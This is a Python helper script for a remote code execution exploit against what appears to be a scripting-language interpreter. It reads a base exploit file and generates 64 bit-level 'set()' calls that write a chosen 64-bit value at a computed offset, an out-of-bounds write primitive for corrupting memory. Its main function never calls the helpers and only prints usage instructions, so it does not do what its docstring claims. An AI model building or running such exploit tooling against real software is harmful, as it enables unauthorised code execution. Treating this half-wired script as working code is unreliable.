#!/usr/bin/env python3
"""
Wrapper script to generate RCE exploit with correct bit_index
1. Runs script to calculate bit_index
2. Extracts bit_index from output
3. Generates write code with correct bit_index
4. Creates final exploit script
"""

import subprocess
import re
import sys

def extract_bit_index(output):
    """Extract bit_index from script output"""
    # Look for "Calculated bit_index:" followed by a number
    match = re.search(r'Calculated bit_index:\s*(\d+)', output)
    if match:
        return int(match.group(1))
    return None

def generate_write_code(bit_index, value):
    """Generate set() calls for writing a 64-bit value"""
    code = []
    for bit in range(64):
        x = bit_index + bit
        y = 0
        bit_value = (value >> bit) & 1
        code.append(f"set(b1, {x}, {y}, {bit_value});")
    return "\n".join(code)

def main():
    # Read the base exploit script
    with open('rce_exploit_final_working.bs', 'r') as f:
        script = f.read()
    
    # Find the write section and replace with placeholder
    write_section_start = script.find('print("Writing 64 bits starting at calculated bit_index...");')
    write_section_end = script.find('print("Write completed");')
    
    if write_section_start == -1 or write_section_end == -1:
        print("Error: Could not find write section in script")
        sys.exit(1)
    
    # Extract the part before and after the write section
    before_write = script[:write_section_start + len('print("Writing 64 bits starting at calculated bit_index...");')]
    after_write = script[write_section_end:]
    
    # For now, just print instructions
    print("To use this wrapper:")
    print("1. Run the exploit script and note the 'Calculated bit_index:' value")
    print("2. Run: python3 rce_generate_write_code.py <bit_index>")
    print("3. Replace the set() calls in the script with the generated code")
    print()
    print("Or manually update the bit_index values in the set() calls")

if __name__ == "__main__":
    main()

